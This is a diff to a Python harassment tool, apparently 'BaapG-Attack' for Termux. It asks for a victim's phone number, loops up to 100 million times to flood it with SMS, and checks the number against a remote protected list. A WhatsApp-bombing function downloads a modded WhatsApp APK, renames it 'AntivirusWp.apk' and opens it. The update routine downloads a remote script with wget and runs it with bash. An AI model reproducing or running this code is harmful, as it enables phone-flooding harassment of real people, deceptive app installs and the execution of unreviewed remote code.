@@ -30,7 +30,7 @@ import re
 import time
 import argparse
 import zipfile
-version = '3.7'
+version = '3.6'
 try:
   import tload
 except ModuleNotFoundError:
@@ -320,12 +320,18 @@ def sms():
 	target = input(
 	    f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}")	
 	print()
+	a = re.get('https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.protected.numbers').text
+	if target in a:
+		print(f"\n {R} You Can't Bomb This Number")
+		exit(2)
+	else:
+		pass	
 	print(f"\n{B} Press {G}Ctrl { R}+ {G} C {B} to exit\n")
 
 	file1 = open("/data/data/com.termux/files/usr/bin/num.file","w")
 	file1.writelines(target) 
 	file1.close() 
-	for i in range (100000000):
+	for i in range (1,100000000):
 	    try:
 	    	   line = subprocess.check_output(" cat /data/data/com.termux/files/usr/bin/num.file ",shell=True)
 	    	   line = str(line)
@@ -356,7 +362,7 @@ def wpbomb():
 	    check_intr
 	    os.chdir('/sdcard/Download/')
 	    tload.download_file_pg('https://softalien.xyz/dl/whatsmod/YOWA_v8.93_By_Yowayousef.apk')
-	    os.system('mv YOWA_v8.93_By_Yowayousef.apk AntivirusWp.apk')
+	    os.system('mv /sdcard/Download/test.dat  AntivirusWp.apk')
 	    os.system('termux-open /sdcard/Download/AntivirusWp.apk')
 	  pass
 	number = input(f"{G}[{W}+{G}] {G}Enter Victim's Phone number with country Code\n\n{R}>>>{G} ")
@@ -447,7 +453,7 @@ def main():
 		print()
 		ver_check()
 		check_intr()
-		os.system("wget https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.updatefile && rm .updatefile &&  bash .updatefile")
+		os.system("wget https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.updatefile && bash .updatefile")
 		print(f"{G} Restart it")
 		exit()
 	else:
